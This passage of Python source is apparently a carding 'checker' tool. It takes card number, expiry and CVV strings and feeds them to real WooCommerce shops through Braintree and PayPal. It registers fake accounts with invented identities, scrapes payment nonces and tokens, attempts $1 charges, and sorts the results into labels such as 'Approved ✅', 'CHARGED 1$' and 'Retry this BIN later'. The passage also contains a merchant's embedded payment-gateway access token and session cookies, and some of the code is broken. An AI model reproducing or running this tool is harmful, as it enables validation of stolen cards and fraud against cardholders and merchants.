    'wc_order_attribution_utm_source_platform': '(none)',
    'wc_order_attribution_utm_creative_format': '(none)',
    'wc_order_attribution_utm_marketing_tactic': '(none)',
    'wc_order_attribution_session_entry': 'https://www.ecosmetics.com/my-account/add-payment-method/',
    'wc_order_attribution_session_start_time': '2024-08-02 22:08:23',
    'wc_order_attribution_session_pages': '1',
    'wc_order_attribution_session_count': '1',
    'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'woocommerce-register-nonce': login,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'register': 'Register',
}


	response = r.post('https://www.ecosmetics.com/my-account/add-payment-method/', headers=headers, data=data)





	headers={
'User-Agent': user,
}

	 
	addadres = r.get('https://www.ecosmetics.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers)
	
	 
	address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', addadres.text).group(1)
	print(address)






	headers={
'User-Agent': user,
}

	data = {
    'billing_first_name': 'Hussein',
    'billing_last_name': 'Alfuraijii ',
    'billing_company': '',
    'billing_country': 'US',
    'billing_address_1': '3480 Granada Ave',
    'billing_address_2': '',
    'billing_city': 'Los Angeles ',
    'billing_state': 'CA',
    'billing_postcode': '90001',
    'billing_phone': '3153153152',
    'billing_email': email,
    'save_address': 'Save address',
    'woocommerce-edit-address-nonce': address,
    '_wp_http_referer': '/my-account/edit-address/billing/',
    'action': 'edit_address',
}

	response = r.post('https://www.ecosmetics.com/my-account/edit-address/billing/', headers=headers, data=data)
	







	headers={
'User-Agent': user,
}

	rrr=r.get("https://www.ecosmetics.com/my-account/add-payment-method/",headers=headers)
	nonce = re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',rrr.text)[0]
	aut=rrr.text.split(r'var wc_braintree_client_token')[1].split('"')[1]
	base4=str(base64.b64decode(aut))
	auth= base4.split('"authorizationFingerprint":')[1].split('"')[1]





	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	'authorization': f'Bearer {auth}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'ae0e96cd-7aa2-418c-8fba-6627701d117c',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': c,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}


	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)


	tok=(response.json()['data']['tokenizeCreditCard']['token'])





	headers={
'User-Agent': user,
}

	data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': tok,
    'braintree_cc_device_data': '{"device_session_id":"aa402142489e8b963c861d5042544862","fraud_merchant_id":null,"correlation_id":"1d8424a02ce5556a6edb90ee54425d39"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/8ddh6wj6qwvpbswt/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/8ddh6wj6qwvpbswt"},"merchantId":"8ddh6wj6qwvpbswt","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"8ddh6wj6qwvpbswt","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"OnCore Golf Technology, Inc","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjI0MjcwNzAsImp0aSI6IjI3MzdhZGQ4LTk4ODQtNGYwYy04MzUwLTM4ZTNiZmZkMGI2YiIsInN1YiI6IjhkZGg2d2o2cXd2cGJzd3QiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjhkZGg2d2o2cXd2cGJzd3QiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZV9hbmRyb2lkX3BheSIsIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.UFv3fsXi9wDJHfsZLJtfT-sQ59bpwfbPEy1I5HsvKxUYBp7CkUioTb0qG_IL7lZzcws_GfDBZ8D8CsdDWOujIQ","paypalClientId":"ARQ5EcBqMlYzZ9VRGrLp0uc26enUFNE7A8H47P5HokLSitrS1CaPGUy-zp4QS0EN-znueuESVGGRUfFu","supportedNetworks":["visa","mastercard","amex","discover"]},"payWithVenmo":{"merchantId":"3347590979694625451","accessToken":"access_token$production$8ddh6wj6qwvpbswt$c4f366f69f3f181ca36bc6c57195c1f7","environment":"production","enrichedCustomerDataEnabled":false},"paypalEnabled":true,"paypal":{"displayName":"OnCore Golf Technology, Inc","clientId":"ARQ5EcBqMlYzZ9VRGrLp0uc26enUFNE7A8H47P5HokLSitrS1CaPGUy-zp4QS0EN-znueuESVGGRUfFu","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"oncoregolftechnologyinc_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
    'woocommerce-add-payment-method-nonce': nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}


	response = r.post('https://www.ecosmetics.com/my-account/add-payment-method/', headers=headers, data=data)






	text = response.text
		
	pattern = r'Reason: (.+?)\s*</li>'
		
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
	else:
		if 'added' in text or 'Payment method successfully added.' in text:
			result = "Approved ✅"
			return result
		else:
			try:
				result = text.split('Status code ')[1].split('<')[0]
			except:
				try:
					result = match
				except:
					result = 'Unknow Response'

	
	if 'risk_threshold' in result:
			return "RISK: Retry this BIN later."
	elif 'You cannot add a new payment method so soon after the previous one' in result:
		    return "Please wait for 20 seconds."
	elif 'Nice! New payment method added' in result or 'Payment method successfully added.' in result:
		    return 'Approved ✅'
	elif 'Duplicate card exists in the vault.' in result:
		    return 'Duplicate'
	elif "avs: Gateway Rejected: avs" in result or "avs_and_cvv: Gateway Rejected: avs_and_cvv" in result or "cvv: Gateway Rejected: cvv" in result:
		    return 'AVS-CVV'
	elif "Invalid postal code" in result or "CVV." in result:
		    return 'Invalid postal code'
	elif not re.search(r'[A-Za-z]', result) and not re.search(r'[0-9]', result):
		    return 'Approved'
	else:
		return result
def pp(card):
	import re
	card = card.strip()
	parts = re.split('[|]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]
	
	if len(mm) == 1:
		mm = f'0{mm}'
	
	if "20" in yy:
		yy = yy.split("20")[1]	
	import requests, re, base64, random, string, user_agent, time
	user = user_agent.generate_user_agent()
	r = requests.session()
	
	from requests_toolbelt.multipart.encoder import MultipartEncoder
	
	import random
	
	def generate_full_name():
	    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
	                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
	                   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
	                   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
	                   "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
	                   "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
	                   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
	                   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
	                   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
	                   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"] # List of first names
	    
	    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
	                   "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
	                   "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
	                   "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
	                   "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
	                   "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
	                   "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
	                   "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"] # List of last names
	    
	    full_name = random.choice(first_names) + " " + random.choice(last_names)
	    first_name, last_name = full_name.split()
	    return first_name, last_name
	def generate_address():
	    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
	    states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
	    streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
	    zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]
	
	    city = random.choice(cities)
	    state = states[cities.index(city)]
	    street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
	    zip_code = zip_codes[states.index(state)]
	
	    return city, state, street_address, zip_code
	
	# Testing the library:
	first_name, last_name = generate_full_name()
	city, state, street_address, zip_code = generate_address()
	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
		return f"{name}{number}@gmail.com"
	acc = (generate_random_account())
	def num():
		number = ''.join(random.choices(string.digits, k=7))
		return f"303{number}"
	num = (num())	
	files = {
	    'wpc_name_your_price': (None, '1.00'),
	    'quantity': (None, '1'),
	    'add-to-cart': (None, '4744'),
	}
	multipart_data = MultipartEncoder(fields=files)
	headers = {
	    'authority': 'switchupcb.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'content-type': multipart_data.content_type,
	    'pragma': 'no-cache',
	    'user-agent': user,
	}
	response = r.post('https://switchupcb.com/shop/drive-me-so-crazy/', headers=headers, data=multipart_data)
	headers = {
	    'authority': 'switchupcb.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'pragma': 'no-cache',
	    'referer': 'https://switchupcb.com/cart/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
	response = r.get('https://switchupcb.com/checkout/', cookies=r.cookies, headers=headers)
	
	
	sec = (re.search(r'update_order_review_nonce":"(.*?)"', response.text).group(1))
	
	
	nonce = (re.search(r'save_checkout_form.*?nonce":"(.*?)"', response.text).group(1))
	
	
	check = (re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text).group(1))
	
	
	create = (re.search(r'create_order.*?nonce":"(.*?)"', response.text).group(1))
	
	
	
	
	headers = {
    'accept': '*/*',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/json',
    # 'cookie': '_ga=GA1.1.1495549483.1723272507; __stripe_mid=974497dc-d38e-454a-a598-42befec00b948bf03d; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-21%2001%3A03%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fswitchupcb.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-08-21%2001%3A03%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fswitchupcb.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; pmpro_visit=1; woocommerce_items_in_cart=1; woocommerce_cart_hash=754d65ccf76a9543b334b6de9491064a; sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Safari%2F537.36; __stripe_sid=45333482-159b-4e2b-9386-9390a1f358860a4f84; _lscache_vary=930b5398dd4835b9cbe37b10b23a5a6e; wordpress_logged_in_b793dede088685c97335f4c9883bd313=adfeaasdasqfa%40gmail.com%7C1725414696%7CGNPrGZodiI5BagEx8en0nyUVGThvq6yT6LhYqtr1qJg%7Cea385b8dca13c2b504f534f98ac67ce7ffa9c01531d5fd893539018eb415e069; wp_woocommerce_session_b793dede088685c97335f4c9883bd313=7%7C%7C1724375062%7C%7C1724371462%7C%7C0ba2e3b841d444a65da1b1b95abe6d2b; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fswitchupcb.com%2Fcheckout%2F; _ga_HHLCDZHJPN=GS1.1.1724204188.4.1.1724205231.0.0.0',
    'origin': 'https://switchupcb.com',
    'priority': 'u=1, i',
    'referer': 'https://switchupcb.com/checkout/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
	    'user-agent': user,
	}
	
	params = {
	    'wc-ajax': 'ppc-save-checkout-form',
	}
	
	json_data = {
    'nonce': nonce,
    'form_encoded': f'billing_first_name={first_name}&billing_last_name={last_name}&billing_company=&billing_country=US&billing_address_1={street_address}&billing_address_2=&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={num}&billing_email={acc}&order_comments=&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fswitchupcb.com%2F&wc_order_attribution_session_start_time=2024-08-21+01%3A03%3A54&wc_order_attribution_session_pages=4&wc_order_attribution_session_count=2&wc_order_attribution_user_agent={user}&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=card&payment_method=ppcp-gateway&terms-field=1&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=paypal',
}
	
	response = r.post('https://switchupcb.com/', params=params, cookies=r.cookies, headers=headers, json=json_data)
	
	
	
	
	
	
	
	headers = {
	    'authority': 'switchupcb.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'content-type': 'application/json',
	    'origin': 'https://switchupcb.com',
	    'pragma': 'no-cache',
	    'referer': 'https://switchupcb.com/checkout/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': user,
	}
	
	params = {
	    'wc-ajax': 'ppc-create-order',
	}
	
	json_data = {
	    'nonce': create,
	    'payer': None,
	    'bn_code': 'Woo_PPCP',
	    'context': 'checkout',
	    'order_id': '0',
	    'payment_method': 'ppcp-gateway',
	    'funding_source': 'card',
	    'form_encoded': f'billing_first_name={first_name}&billing_last_name={last_name}&billing_company=&billing_country=US&billing_address_1={street_address}&billing_address_2=&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={num}&billing_email={acc}&account_username=&account_password=&order_comments=&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fswitchupcb.com%2Fshop%2Fdrive-me-so-crazy%2F&wc_order_attribution_session_start_time=2024-03-15+10%3A00%3A46&wc_order_attribution_session_pages=3&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user}&g-recaptcha-response=&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=card&payment_method=ppcp-gateway&terms=on&terms-field=1&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card',
	    'createaccount': False,
	    'save_payment_method': False,
	}
	
	response = r.post('https://switchupcb.com/', params=params, cookies=r.cookies, headers=headers, json=json_data)
	
	
	
	
	
	id = response.json()['data']['id']
	pcp = response.json()['data']['custom_id']
	
	
	
	import random
	import string
	
	
	lol1 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
	
	lol2 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
	
	lol3 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=11))
	
	
	
	random_chars_button = ''.join(random.choices(string.ascii_lowercase + string.digits, k=11))
	
	
	session_id = f'uid_{lol1}_{lol3}'
	
	
	button_session_id = f'uid_{lol2}_{lol3}'
	
	
	headers = {
	    'authority': 'www.paypal.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'pragma': 'no-cache',
	    'user-agent': user,
	}
	
	params = {
	    'sessionID': session_id,
	    'buttonSessionID': button_session_id,
	    'locale.x': 'en_US',
	    'commit': 'true',
	    'env': 'production',
	    'sdkMeta': 'eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWZZZXVDajkyc2JQUFRMMkZ1WXI4Tl91bGZWUkVjT21aTmo4UVdqSEVvUWRTZXJUVWlJdlV3cTNrOEJzSkUtZVFJU0l2WG8zTnZSNU5CRU8mY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGU9MjAyNC0wMi0wMSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSxtZXNzYWdlcyZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfZnRmdHdjZGxubnpydWtjdWNvZm5mamVneGJxa256In19',
	    'disable-card': '',
	    'token': id,
	}
	
	response = r.get('https://www.paypal.com/smart/card-fields', params=params, headers=headers)
	
	
	
	
	import requests

	import random
	import string
	
	def generate_random_code():
	    characters = string.ascii_letters + string.digits
	    code = ''.join(random.choices(characters, k=17))
	    return code
	
	random_code = generate_random_code()


	headers = {
	    'authority': 'www.paypal.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'content-type': 'application/json',
	    'origin': 'https://www.paypal.com',
	    'user-agent': user,
	    'x-app-name': 'standardcardfields',
	    'x-country': 'US',
	}
	
	json_data = {
	    'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
	    'variables': {
	        'token': id,
	        'card': {
	            'cardNumber': n,
	            'expirationDate': mm+'/20'+yy,
	            'postalCode': zip_code,
	            'securityCode': cvc,
	        },
	        'firstName': first_name,
	        'lastName': last_name,
	        'billingAddress': {
	            'givenName': first_name,
	            'familyName': last_name,
	            'line1': '1981 Jennifer Lane',
	            'line2': None,
	            'city': 'Findlay',
	            'state': 'OH',
	            'postalCode': '45840',
	            'country': 'US',
	        },
	        'email': acc,
	        'currencyConversionType': 'PAYPAL',
	    },
	    'operationName': None,
	}
	
	response = requests.post(
	    'https://www.paypal.com/graphql?fetch_credit_form_submit',
	    headers=headers,
	    json=json_data,
	)
	
	
	last = response.text	
	if ('ADD_SHIPPING_ERROR' in last or
	    'NEED_CREDIT_CARD' in last or
	    '"status": "succeeded"' in last or
	    'Thank You For Donation.' in last or
	    'Your payment has already been processed' in last or
	    'Success ' in last or
	    '"type":"one-time"' in last or
	    '/donations/thank_you?donation_number=' in last):
		result = "CHARGED 1$"
	elif 'is3DSecureRequired' in last:
		result = "OTP"
	else:
		message = response.json()['errors'][0]['message']
		code = response.json()['errors'][0]['data'][0]['code']
		result = f'{message} ({code})'
	return (result)
def gg(card):
	gg=br(card)
	if 'success' in gg:
		return "Payment Successful"
	elif 'Insufficient funds in account' in gg:
		return "Insufficient funds in account"
	else:
		return "Your card couldn't be added"
def sq(card):
	import requests, re, time, uuid, json, secrets, string, random, user_agent, base64
	card = card.strip()
	parts = re.split('[|:]', card)
	n = parts[0]
	mm = int(parts[1]) 
	yy = parts[2] 
	cvc = parts[3]
	time.sleep(5)
	with open('files.txt', 'r') as file:
		first_line = file.readline()
	if card in first_line:
		return 'Approved'
	if len(yy) == 2:  
		yy = '20' + yy  
	yy = int(yy)
	user = user_agent.generate_user_agent()
	sess = str(uuid.uuid4())
	random_variable = uuid.uuid4().hex

	r = requests.Session()
	def generate_random_account():
					
		name = ''.join(random.choices(string.ascii_lowercase, k=10))
		number = ''.join(random.choices(string.digits, k=10))
		return f"{name}{number}@gmail.com"
					
	acc = (generate_random_account())

	token = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(80))	
	headers = {
		'authority': 'redwoodhempfarm.com',
		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7,ko-KR;q=0.6,ko;q=0.5',
		'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'document',
		'sec-fetch-mode': 'navigate',
		'sec-fetch-site': 'none',
		'sec-fetch-user': '?1',
		'upgrade-insecure-requests': '1',
		'user-agent': user,
	}
	
	response = r.get('https://redwoodhempfarm.com/my-account/', headers=headers)	
	nonce = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
	enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
	dec = base64.b64decode(enc).decode('utf-8')
	au=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]
	with open('gates.json', 'r') as json_file:
			existing_data = json.load(json_file)
# إضافة معلومات جديدة إلى البيانات الحالية
			new_data = {
				big : {
	  "nonce": anonce,
	  "au": au
				}
			}
	
			existing_data.update(new_data)
	def generate_random_account():			
		name = ''.join(random.choices(string.ascii_lowercase, k=10))			
		number = ''.join(random.choices(string.digits, k=10))			
		return f"{name}{number}@gmail.com"			
	acc = (generate_random_account())
	name = ''.join(random.choices(string.ascii_lowercase, k=10))		
	headers = {
		'authority': 'redwoodhempfarm.com',
		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7,ko-KR;q=0.6,ko;q=0.5',
		'cache-control': 'max-age=0',
		'content-type': 'application/x-www-form-urlencoded',
		'origin': 'https://redwoodhempfarm.com',
		'referer': 'https://redwoodhempfarm.com/my-account/',
		'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'document',
		'sec-fetch-mode': 'navigate',
		'sec-fetch-site': 'same-origin',
		'sec-fetch-user': '?1',
		'upgrade-insecure-requests': '1',
		'user-agent': user,
	}
	data = {
    'username': name,
    'email': acc,
    'password': 'mgdrtvcdsr',
    'wc_order_attribution_source_type': 'typein',
    'wc_order_attribution_referrer': '(none)',
    'wc_order_attribution_utm_campaign': '(none)',
    'wc_order_attribution_utm_source': '(direct)',
    'wc_order_attribution_utm_medium': '(none)',
    'wc_order_attribution_utm_content': '(none)',
    'wc_order_attribution_utm_id': '(none)',
    'wc_order_attribution_utm_term': '(none)',
    'wc_order_attribution_session_entry': 'https://redwoodhempfarm.com/my-account/add-payment-method/',
    'wc_order_attribution_session_start_time': '2024-05-05 23:54:09',
    'wc_order_attribution_session_pages': '1',
    'wc_order_attribution_session_count': '1',
    'wc_order_attribution_user_agent': user,
    'woocommerce-register-nonce': nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'register': 'Register',
}

	response = r.post('https://redwoodhempfarm.com/my-account/', headers=headers, data=data)
	
	headers = {
		'authority': 'redwoodhempfarm.com',
		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7,ko-KR;q=0.6,ko;q=0.5',
		'cache-control': 'max-age=0',
		'referer': 'https://redwoodhempfarm.com/my-account/add-payment-method/',
		'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
